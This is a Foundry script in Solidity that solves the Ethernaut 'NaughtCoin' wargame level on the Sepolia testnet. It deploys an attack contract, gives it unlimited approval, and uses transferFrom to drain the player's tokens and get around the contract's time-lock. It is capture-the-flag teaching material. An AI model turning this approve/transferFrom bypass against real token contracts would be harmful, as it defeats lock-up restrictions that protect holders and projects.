// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/NaughtCoin.s.sol --tc NaughtCoinSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

contract NaughtCoinSolution is Script {

    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = payable(vm.envAddress("NAUGHTCOIN_INSTANCE"));

    // Attack idea: The player address is the owner of the contract and the owner can't transfer the tokens until the timeLock has passed
    // In order to bypass this, we will create a contract, approve the contract to spend the tokens and then call the transferFrom function from the contract
    // with the player address and the initial supply

    function run() external {
        vm.startBroadcast(deployerPrivateKey);

        NaughtCoinAttack attackContract = new NaughtCoinAttack();
        NaughtCoin naughtCoinInstance = NaughtCoin(instance);
        // approve the attack contract to spend the tokens (infinite approval)
        naughtCoinInstance.approve(address(attackContract), type(uint256).max);
        console.log("Player balance before attack: ",  naughtCoinInstance.balanceOf(naughtCoinInstance.player()));
        attackContract.attack(instance, naughtCoinInstance.balanceOf(naughtCoinInstance.player()));
        console.log("Player balance after attack: ",  naughtCoinInstance.balanceOf(naughtCoinInstance.player()));
        require(naughtCoinInstance.balanceOf(naughtCoinInstance.player()) == 0, "The player balance should be 0");
        vm.stopBroadcast();
    }

}


contract NaughtCoinAttack {
    // this contract can be work for other instances of the NaughtCoin contract
    function attack(address NaughtCoinInstance, uint256 amount) public {
        NaughtCoinInstance.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", msg.sender, address(this), amount));
    }

}